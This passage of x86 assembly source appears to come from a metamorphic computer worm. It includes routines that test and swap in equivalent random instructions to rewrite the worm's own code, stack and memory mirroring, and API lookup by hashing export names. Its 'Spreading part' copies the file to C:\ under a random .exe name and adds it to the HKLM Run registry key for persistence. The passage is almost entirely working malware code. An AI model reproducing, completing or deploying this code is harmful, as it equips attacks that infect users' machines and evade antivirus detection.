		    cc rAD,	 xchg,	  cl, dl	     ; Back
					       ; al = GBT
					       ; ah = 1 shl dl
		    cc rADF,	  and,	   al, ah
		 cc rNoEmul,	 jz, BBNoNeedForComparing

		 BBCompareNoException:

		    cc rAD,	 mov,	  eax, dword[BBTableFileCode+edx*4]
		    cc rABD,	 mov,	  ebx, dword[BBTableRandomCode+edx*4]
		    cc rADF,	 cmp,	  eax, ebx
		    cc rNoEmul,  jne,	  BBNotEqual

	     BBNoNeedForComparing:
		cc rD,	 inc,	  edx
		cc rDF,  cmp,	  edx, (BehaviourTableSize)/4
	   cc rNoEmul,	jb,   BBCompareNextByte

	; EQUAL!!!

	   cc rC,      pop,	ecx
	   cc rC,      inc,	ecx
	   cc rC,      push,	ecx

	   cc rAC,     mov,	al, byte[tmpGBT]
	   cc rACF,    and,	al, 10000000b	     ; FLAGS?
	   cc rNoEmul, jnz,	BBEndCheckWithFlags  ; If compare flags, do more BlackBox tests

	   cc rCF,     cmp,	ecx, 100
	cc rNoEmul, js, PerformeAnotherBlackBoxTest

	BBEndCheckWithFlags:
	   cc rCF,     cmp,	ecx, 1000
	cc rNoEmul, js, PerformeAnotherBlackBoxTest

	BBFoundEqual:
	cc rNoRes,   pop,     eax	      ; Trash

	cc rNoEmul,  popad
	cc rA,	     xor,     eax, eax
cc rNoEmul,  ret


   BBNotEqual:
	cc rNoRes,   pop,     eax	      ; Trash

	cc rNoEmul,  popad
	cc rA,	     mov, eax, -1
cc rNoEmul, ret




BlackBoxTestingWithSimilarParameters:
		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableFileCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax

		VEH_TRY FC2SIM


	   ; Prepare Registers and BehaviourTables
	   ; But this time with similar values as for primary test


		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEAX]
		cc rA,	     mov,     dword[BBTableFileCode+0x00], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x00], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEBX]
		cc rA,	     mov,     dword[BBTableFileCode+0x04], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x04], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rECX]
		cc rA,	     mov,     dword[BBTableFileCode+0x08], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x08], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEDX]
		cc rA,	     mov,     dword[BBTableFileCode+0x0C], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x0C], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEBP]
		cc rA,	     mov,     dword[BBTableFileCode+0x10], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x10], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rESI]
		cc rA,	     mov,     dword[BBTableFileCode+0x14], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x14], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEDI]
		cc rA,	     mov,     dword[BBTableFileCode+0x18], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x18], eax

		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]

		cc rABCDPSI, mov,     dword[BBTableFileCode+0x20], esp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x20], esp

		cc rABCDPSI, sub,     dword[BBTableFileCode+0x20], 0x08       ; esp is esp+8 here because of
		cc rABCDPSI, sub,     dword[BBTableRandomCode+0x20], 0x08     ; two less calls. But that makes no difference
								; just gives a zero in the LBT if no stack change
								; occures, that makes further codes easier


		cc rNoEmul,  pushad		; Save all registers
			cc rNoEmul,  pushfd	; Push Flag-dword to stack
			cc rA,	     pop,     eax     ; eax=FLAGS

			cc rNoEmul,  call,    GetGoodRandomNumber	      ; new random number in dword[RandomNumber]
			cc rAB,      mov,     ebx, dword[RandomNumber]	      ; ebx = new random number

			cc rAB,      and,     ebx, 100011000001b	      ; Just change CF, ZF, SF, OF

			cc rA,	     xor,     eax, ebx		    ; FLAGS xor (dword[RandomNumber] && 100011000001)

			cc rA,	     push,    eax
			cc rNoEmul,  popfd

			cc rAF,      mov,     dword[BBTableFileCode+0x1C], eax
			cc rF,	     mov,     dword[BBTableRandomCode+0x1C], eax
		cc rNoEmul,  popad


		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC2SIM

		VEH_END FC2SIM


		VEH_TRY RC2SIM

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, RandomCodeExecution
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory


		cc rA,	     mov,     eax, BBTableRandomCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rA,	     mov,     dword[tmpAddress2], eax
	   ; Prepare Registers for RandomCode
		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]
		cc rABCDPSI, push,    dword[BBTableRandomCode+0x1C]   ; Flags
		cc rNoEmul,  popfd,				      ; Save flags

;                mov,     esp, dword[eax+0x20]           ; should be the same
;                cc rNoEmul,  call,    RandomCodeExecution2

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION RC2SIM

		VEH_END RC2SIM

		cc rA,	     mov,     al, byte[bExceptionFC2SIM]
		cc rAF,      cmp,     al, byte[bExceptionRC2SIM]
		cc rNoEmul,  jne,     BBNotEqual	      ; If just one failed, the codes were not the same

		cc rAF,      cmp,     al, 1
		cc rNoEmul,  jne,     BBSimBothNoException	 ; If non of them fail, continue with the standard procedure

		cc rA,	     mov,     al, byte[BBExceptionCount]   ; Both failed -> increase BBExceptionCount, check if Limit if reached
		cc rA,	     inc,     al
		cc rA,	     mov,     byte[BBExceptionCount], al

		cc rAF,      cmp,     al, 23
		cc rNoEmul,  je,      BBNotEqual

		cc rNoEmul,  jmp,     PerformeAnotherBlackBoxTest

		BBSimBothNoException:
		cc rD,	     xor,     edx, edx		 ; Byte Counter in Table
		cc rNoRes,   mov,     byte[BBExceptionCount], dl
	   BBSimCompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx
		    cc rDF,   cmp,     edx, 8
		 cc rNoEmul, jge,     BBSimCompareNoException


		    cc rAD,   mov,     al, byte[tmpGBT]   ; Get the GlobalBT (1 byte) for
							 ; the current command

		    cc rAD,   mov,     ah, 1		  ; ah = 1
		    cc rACD,  xchg,    cl, dl		  ; change
		    cc rACD,  shl,     ah, cl		  ;
		    cc rACD,  xchg,    cl, dl		  ; Back
					       ; al = GBT
					       ; ah = 1 shl dl
		    cc rADF,  and,     al, ah
		 cc rNoEmul,  jz BBSimNoNeedForComparing

		 BBSimCompareNoException:

		    cc rAD,	mov,	 eax, dword[BBTableFileCode+edx*4]
		    cc rABD,	mov,	 ebx, dword[BBTableRandomCode+edx*4]
		    cc rABDF,	cmp,	 eax, ebx
		    cc rNoEmul, jne,	 BBNotEqual

	     BBSimNoNeedForComparing:
		cc rAD,     inc,     edx
		cc rADF,    cmp,     edx, (BehaviourTableSize)/4
	   cc rNoEmul,	jb,   BBSimCompareNextByte

	; EQUAL!!!

	   cc rC,      pop,	ecx
	   cc rC,      inc,	ecx
	   cc rC,      push,	ecx

	   cc rAC,     mov,	al, byte[tmpGBT]
	   cc rACF,    and,	al, 10000000b		    ; FLAGS?
	   cc rNoEmul, jnz     BBSimEndCheckWithFlags	    ; If compare flags, do more BlackBox tests

	   cc rCF,     cmp,	ecx, 100
	cc rNoEmul, js, BlackBoxTestingWithSimilarParameters
		; Uuuhh yeah! :D
		; Found some nice memory equivalent!
cc rNoEmul,  jmp,     BBFoundEqual


	BBSimEndCheckWithFlags:
	   cc rCF,   cmp,     ecx, 1000
	cc rNoEmul,  js, BlackBoxTestingWithSimilarParameters
		; Uuuhh yeah! :D
		; Found some nice memory equivalent!
cc rNoEmul,  jmp,     BBFoundEqual


; #####
; #####   BlackBox Testing
; #####   Send in different parameters and compare output
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Substitute original command with equivalent commands
; #####

SubstituteCommand:
; In: ecx=command number
;     qword[RandomCode] ... random code which will substitute the original one

	cc rNoEmul,  pushad

	cc rNoRes,   push,    ecx
	cc rNoEmul,  call,    CloseRandomFile	      ; With read protection-flag
	cc rNoEmul,  call,    OpenRandomFileWrite     ; With write protection-flag
	cc rC,	     pop,     ecx

	cc rCD,      xor,     edx, edx
	cc rAD,      mov,     eax, ecx
	cc rABD,     mov,     ebx, 8
	cc rA,	     mul,     ebx      ; EDX:EAX=EAX*EBX=Command Number*8

	cc rAS,      mov,     esi, RandomCode
	cc rSI,      mov,     edi, eax
	cc rSI,      add,     edi, dword[WormCodeStart]

	cc rASI,     mov,     eax, dword[esi]
	cc rSI,      mov,     dword[edi], eax
	cc rASI,     mov,     eax, dword[esi+4]
	cc rSI,      mov,     dword[edi+4], eax

	cc rNoEmul,  call,    CloseRandomFile	      ; With write protection-flag
	cc rNoEmul,  call,    OpenRandomFileRead      ; With read protection-flag

	cc rNoEmul,  popad
cc rNoEmul,  jmp, SubstituteCommandEnd


; #####
; #####   Substitute original command with equivalent commands
; #####
; ###########################################################################
; ###########################################################################


; ###########################################################################
; ###########################################################################
; #####
; #####   Mirroring/Restoring the stack/memory
; #####

MirrorTheStack:
	cc rP,	    pop,     ebp	     ; The only different thing
					     ; should the the current return value
	cc rNoRes,  mov,     dword[tmpRetVal], ebp

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READWRITE
	cc rNoRes,  push,    dword[hStackSize]
	cc rNoRes,  push,    dword[hStackMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Write Protection Flag

	cc rA,	    mov,     eax, dword[hStackMirror]
	cc rAD,     mov,     edx, dword[hStackSize]	  ; Size of stack
	cc rADS,    mov,     esi, dword[hStackStart]	  ; Start of stack
	cc rADSI,   mov,     edi, eax  ; VirtualMemory for Stack
	cc rCDSI,   xor,     ecx, ecx

	MirrorTheStackMore:
		cc rACDSI,  mov,     eax, dword[esi]
		cc rACDSI,  mov,     dword[edi], eax
		cc rCDSI,   add,     edi, 4
		cc rCDSI,   add,     esi, 4
		cc rCDSI,   add,     ecx, 4
		cc rCDSIF,  cmp,     ecx, edx
	cc rNoEmul,  jb,      MirrorTheStackMore

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READONLY
	cc rNoRes,  push,    dword[hStackSize]
	cc rNoRes,  push,    dword[hStackMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Protect it!

	cc rP,	    mov,     ebp, dword[tmpRetVal]
	cc rNoRes,  push,    ebp		     ; Current return-value
cc rNoEmul, ret


RestoreTheStack:
	cc rP,	    pop,     ebp	     ; The only different thing
				 ; should the the current return value

	cc rDP,     mov,     edx, dword[hStackSize]	 ; Size of stack
	cc rDPS,    mov,     esi, dword[hStackMirror]	 ; VirtualMemory for Stack
	cc rDPSI,   mov,     edi, dword[hStackStart]	 ; Start of Stack
	cc rCDPSI,  xor,     ecx, ecx

	RestoreTheStackMore:
		cc rACDPSI, mov,     eax, dword[esi]
		cc rCDPSI,  mov,     dword[edi], eax
		cc rCDPSI,  add,     edi, 4
		cc rCDPSI,  add,     esi, 4
		cc rCDPSI,  add,     ecx, 4
		cc rCDPSIF, cmp,     ecx, edx
	cc rNoEmul,  jb,      RestoreTheStackMore

	cc rNoRes,  push,    ebp		     ; Current return-value
cc rNoEmul,  ret


RestoreTheMemory:
	cc rC,	    xor,     ecx, ecx
	cc rC,	    mov,     dword[tmpMemProtection], ecx

	cc rCS,     mov,     esi, dword[hDataMirror]
	cc rCSI,    mov,     edi, DataStart

	RestoreTheMemoryMore:
		cc rACSI,   mov,     eax, dword[esi]
		cc rCSI,    mov,     dword[edi], eax
		cc rCSI,    add,     esi, 4
		cc rCSI,    add,     edi, 4
		cc rCSI,    add,     ecx, 4
		cc rCSIF,   cmp,     ecx, (DataEnd-DataStart)
	cc rNoEmul,  jb,      RestoreTheMemoryMore

	cc rA,	    xor,     eax, eax
	cc rNoRes,  mov,     dword[tmpMemProtection], eax
cc rNoEmul,  ret


MirrorTheMemory:

	cc rBCDPSIF,  mov, dword[tmpDWA], eax
	cc rBDPSIF,   mov, dword[tmpDWC], ecx
	cc rNoEmul,   pushfd
	cc rBCDPSIF,  pop,     ecx	       ; ecx=flags

	cc rBCDPSIF, pop, dword[tmpDWB]       ; Return address

				; There could be 8 pop, or push

	cc rBCDPSIF, pop, dword[tmpDW1]       ; 1st
	cc rBCDPSIF, pop, dword[tmpDW2]       ; 2nd
	cc rBCDPSIF, pop, dword[tmpDW3]       ; 3nd
	cc rBCDPSIF, pop, dword[tmpDW4]       ; 4nd
	cc rBCDPSIF, pop, dword[tmpDW5]       ; 5st
	cc rBCDPSIF, pop, dword[tmpDW6]       ; 6nd
	cc rBCDPSIF, pop, dword[tmpDW7]       ; 7nd
	cc rBCDPSIF, pop, dword[tmpDW8]       ; 8nd

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rBCDPSIF, push,    dword[tmpDWB]
	cc rABCDPSIF,mov,     eax, dword[tmpDWA]

	cc rABCDPSIF,push,    ecx	    ; ecx=flags -> pushfd
	cc rABCDPSIF,mov,     ecx, dword[tmpDWC]

	cc rNoEmul,  pushad
		cc rNoEmul,  call,    CreateRandomizedData

		cc rNoRes,   push,    tmpMemProtection
		cc rNoRes,   push,    PAGE_READWRITE
		cc rNoRes,   push,    (DataEnd-DataStart)
		cc rNoRes,   push,    dword[hDataMirror]
		cc rNoEmul,  stdcall, dword[_VirtualProtect]
		cc rA,	     xor, eax, eax
		cc rNoRes,   mov,     dword[tmpMemProtection], eax


		cc rC,	     xor,     ecx, ecx
		cc rCS,      mov,     esi, DataStart
		cc rCSI,     mov,     edi, dword[hDataMirror]

		MirrorTheMemoryMore:
			cc rACSI,    mov,     eax, dword[esi]
			cc rCSI,     mov,     dword[edi], eax
			cc rCSI,     add,     esi, 4
			cc rCSI,     add,     edi, 4
			cc rCSI,     add,     ecx, 4

			cc rCSIF,    cmp,     ecx, (DataEnd-DataStart)
		cc rNoEmul,  jb,      MirrorTheMemoryMore


		cc rNoRes,  push,    tmpMemProtection
		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    dword[hDataMirror]
		cc rNoEmul, stdcall, dword[_VirtualProtect]
		cc rA,	    xor, eax, eax
		cc rNoRes,  mov,     dword[tmpMemProtection], eax

		cc rC,	    xor,     ecx, ecx

		cc rCS,     mov,     esi, dword[hRandomizedData]
		cc rCSI,    mov,     edi, DataStart

		MirrorTheMemoryWriteRandomStuff:
			cc rACSI,   mov,     eax, dword[esi]
			cc rCSI,    mov,     dword[edi], eax
			cc rCSI,    add,     esi, 4
			cc rCSI,    add,     edi, 4
			cc rCSI,    add,     ecx, 4

			cc rCSIF,   cmp,     ecx, (DataEnd-DataStart)
		cc rNoEmul,  jb,    MirrorTheMemoryWriteRandomStuff
	cc rNoEmul, popad
	cc rNoEmul, popfd
cc rNoEmul, ret


CreateRandomizedData:
       cc rNoRes,  push,     tmpMemProtection
       cc rNoRes,  push,     PAGE_READWRITE
       cc rNoRes,  push,     (DataEnd-DataStart)
       cc rNoRes,  push,     dword[hRandomizedData]
       cc rNoEmul, stdcall,  dword[_VirtualProtect]

       cc rC,	   xor,      ecx, ecx
       cc rCI,	   mov,      edi, dword[hRandomizedData]
       CreateRandomizedDataMore:
		cc rNoEmul, call,     GetRandomNumber
		cc rACI,    mov,      eax, dword[RandomNumber]
		cc rCI,     mov,      dword[edi], eax
		cc rCI,     add,      edi, 4
		cc rCI,     add,      ecx, 4
		cc rCIF,    cmp,      ecx, (DataEnd-DataStart)
       cc rNoEmul,  jb,     CreateRandomizedDataMore

       cc rA,	    mov,      eax, dword[hDataMirror]
       cc rAC,	    mov,      ecx, (hDataMirror-DataStart)
       cc rACI,     mov,      edi, dword[hRandomizedData]
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hDataMirror1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hDataMirror2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[tmpAddress1]
       cc rACI,     mov,      ecx, (tmpAddress-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (tmpAddress1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (tmpAddress2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[hTempAlloc1]
       cc rACI,     mov,      ecx, (hTempAlloc1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hTempAlloc2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[hRandomizedData]
       cc rACI,     mov,      ecx, (hRandomizedData-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hRandomizedData1-DataStart)
       cc rNoRes,   mov,      dword[edi+ecx], eax

       cc rNoRes,   push,    tmpMemProtection
       cc rNoRes,   push,    PAGE_READONLY
       cc rNoRes,   push,    (DataEnd-DataStart)
       cc rNoRes,   push,    dword[hRandomizedData]
       cc rNoEmul,  stdcall, dword[_VirtualProtect]
 cc rNoEmul,  ret

; #####
; #####   Mirroring/Restoring the memory
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Find addresses of APIs
; #####

GetAllAPIAddresses:
	cc rA,	     mov,     eax, ""kern""
	cc rNoRes,   mov,     dword[_DLLkernel32+0x00], eax
	cc rA,	     mov,     eax, ""el32""
	cc rNoRes,   mov,     dword[_DLLkernel32+0x04], eax
	cc rA,	     mov,     eax, "".dll""
	cc rNoRes,   mov,     dword[_DLLkernel32+0x08], eax

	cc rA,	     mov,     eax, APIMagicNumbersKernel32
	cc rNoRes,   mov,     dword[APICurrentMagicNum], eax
	cc rA,	     mov,     eax, APINumbersKernel
	cc rNoRes,   mov,     dword[APICurrentNumber], eax
	cc rA,	     mov,     eax, APIAddressesKernel
	cc rNoRes,   mov,     dword[APICurrentAddress], eax

	cc rNoRes,   push,    _DLLkernel32
	cc rNoEmul,  stdcall, dword[LoadLibrary]
	cc rNoRes,   mov,     dword[hDLLkernel32], eax

	cc rNoEmul,  call,    FindAPIsInLibrary

	cc rA,	     mov,     eax, ""adva""
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x00], eax
	cc rA,	     mov,     eax, ""pi32""
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x04], eax
	cc rA,	     mov,     eax, "".dll""
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x08], eax

	cc rA,	     mov,     eax, APIMagicNumbersAdvapi32
	cc rNoRes,   mov,     dword[APICurrentMagicNum], eax
	cc rA,	     mov,     eax, APINumbersAdvapi
	cc rNoRes,   mov,     dword[APICurrentNumber], eax
	cc rA,	     mov,     eax, APIAddressesAdvapi
	cc rNoRes,   mov,     dword[APICurrentAddress], eax

	cc rNoRes,   push,    _DLLadvapi32
	cc rNoEmul,  stdcall, dword[LoadLibrary]
	cc rNoRes,   mov,     dword[hDLLkernel32], eax

	cc rNoEmul,  call,    FindAPIsInLibrary

	cc rA,	     mov,     eax, dword[_VirtualAlloc]
	cc rNoRes,   mov,     dword[_VirtualAlloc1], eax
	cc rA,	     mov,     eax, dword[_VirtualProtect]
	cc rNoRes,   mov,     dword[_VirtualProtect1], eax
cc rNoEmul, ret


FindAPIsInLibrary:
; In: eax = handle to DLL

	cc rAB,     mov,     ebx, dword[eax+0x3C]
	cc rAB,     add,     ebx, eax			     ; relative -> absolut
	cc rAB,     mov,     dword[hKernelPE], ebx

	cc rAS,     mov,     esi, dword[ebx+0x78]
	cc rAS,     add,     esi, eax			     ; relative -> absolut
	cc rAS,     add,     esi, 0x1C

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax
	cc rAS,     mov,     dword[hAddressTable], ebx
	cc rAS,     add,     esi, 0x4

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hNamePointerTable], ebx
	cc rAS,     add,     esi, 0x4

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hOrdinalTable], ebx

	cc rS,	    mov,     esi, dword[hNamePointerTable]
	cc rSI,     mov,     edi, dword[APICurrentAddress]
	cc rDSI,    mov,     edx, dword[APICurrentMagicNum]

	cc rDSI,     sub,     esi, 4
	cc rDPSI,    xor,     ebp, ebp
	cc rDPSI,    dec,     ebp

	cc rCDPSI,   xor,     ecx, ecx

	FindAPIsInLibraryGetNextAPI:
	cc rNoEmul,  pushad
		FindAPIsInLibraryNext:
			cc rDPSI,   inc,     ebp
			cc rDPSI,   add,     esi, 4
			cc rBDPSI,  mov,     ebx, dword[esi]
			cc rBDPSI,  add,     ebx, dword[hDLLkernel32]

			cc rNoEmul, call,    FindAPIGiveMeTheHash

			cc rADPSIF, cmp,     eax, dword[edx]
		cc rNoEmul, jne,     FindAPIsInLibraryNext


		cc rPSI,     mov,     esi, ebp	  ; coutner
		cc rPSI,     shl,     esi, 0x1	  ; esi*=2
	
		cc rPSI,     add,     esi, dword[hOrdinalTable]   ; esi=Pointer to ordinal table
		cc rBPSI,    xor,     ebx, ebx			  ; ebx=0
		cc rBPSI,    mov,     ebx, dword[esi]		  ; bx=Ordinal
		cc rBPSI,    and,     ebx, 0xFFFF

		cc rBPSI,    shl,     ebx, 0x2			  ; ebx=Ordinal*4
		cc rBPSI,    add,     ebx, dword[hAddressTable]   ; ebx=Pointer to Address of API
		cc rBPSI,    mov,     ebx, dword[ebx]
		cc rBPSI,    add,     ebx, dword[hDLLkernel32]	  ; relative -> absolut
		cc rPSI,     mov,     dword[edi], ebx
	cc rNoEmul,  popad
	cc rCDPSI,   inc,     ecx
	cc rCDPSI,   add,     edi, 4
	cc rCDPSI,   add,     edx, 4
	cc rCDPSIF,  cmp,     ecx, dword[APICurrentNumber]
	cc rNoEmul,  jb,      FindAPIsInLibraryGetNextAPI
cc rNoEmul, ret


FindAPIGiveMeTheHash:
; In: ebx=pointer to API name
; Out: eax=Hash   (in ax)
; changed: eax
;        mov,     ebx, apistr

	cc rBCDPSI, push,    ebx
	cc rBDPSI,  push,    ecx
	cc rBPSI,   push,    edx
	cc rABPSI,  xor,     eax, eax
	cc rABCPSI, xor,     ecx, ecx
	cc rABCPSI, dec,     ebx
	FindAPIGiveMeTheHashMore:
		cc rABCPSI,   xor,     eax, ecx
		cc rABCPSI,   inc,     ebx
		cc rABCPSI,   mov,     ecx, dword[ebx]
		cc rABCDPSI,  mov,     edx, ecx        ; ecx=nooo - n ... new byte
		cc rABCDPSI,  shr,     edx, 24	       ; edx=000n ... new byte
		cc rABCDPSIF, cmp,     dl, 0	       ; dl=n
	cc rNoEmul, jne,     FindAPIGiveMeTheHashMore

	cc rABPSI,   sub,     al, byte[ebx+0]
	cc rABPSI,   add,     ah, byte[ebx+1]
	cc rABPSI,   xor,     al, byte[ebx+2]

	cc rAPSI,    and,     eax, 0xFFFF
	cc rADPSI,   pop,     edx
	cc rACDPSI,  pop,     ecx
	cc rABCDPSI, pop,     ebx
cc rNoEmul, ret

; #####
; #####   Find addresses of APIs
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Spreading part
; #####

CopyFileAndRegEntry:
	cc rS,	     xor,     esi, esi
	CopyFileAndRegEntryMore:
		cc rBS,      mov,     ebx, 26
		cc rBCS,     mov,     ecx, 97
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rS,	     mov,     byte[RandomFileName+esi], dl
		cc rS,	     inc,     esi
		cc rSF,      cmp,     esi, 8
	cc rNoEmul,  jb,     CopyFileAndRegEntryMore

	cc rA,	     mov,     eax, "".exe""
	cc rNoRes,   mov,     dword[RandomFileName+esi], eax

	cc rA,	     mov,     al, ""C""
	cc rNoRes,   mov,     byte[SpaceForHDC+1], al
	cc rA,	     mov,     al, "":""
	cc rNoRes,   mov,     byte[SpaceForHDC+2], al
	cc rA,	     mov,     al, ""\""
	cc rNoRes,   mov,     byte[SpaceForHDC+3], al

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    dword[hMyFileName]
	cc rNoEmul,  stdcall, dword[_CopyFileA]

;  Encrypted representation of ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""
;  Will be a very good surface for this morphism

	cc rA,	     mov,     eax, stKey
	cc rAB,      mov,     ebx, ""SOFT""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""WARE""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""\Mic""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""roso""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ft\W""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""indo""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ws\C""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""urre""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ntVe""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""rsio""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""n\Ru""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     bl, ""n""
	cc rA,	     mov,     byte[eax], bl

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    hKey
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    KEY_ALL_ACCESS
	cc rNoRes,   push,    REG_OPTION_NON_VOLATILE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    stKey
	cc rNoRes,   push,    HKEY_LOCAL_MACHINE
	cc rNoEmul,  stdcall, dword[_RegCreateKeyExA]

	cc rNoRes,   push,    16
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    REG_SZ
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegSetValueExA]

	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegCloseKey]

	cc rNoEmul,  call,    OpenRandomFileRead

	cc rA,	     xor,     eax, eax
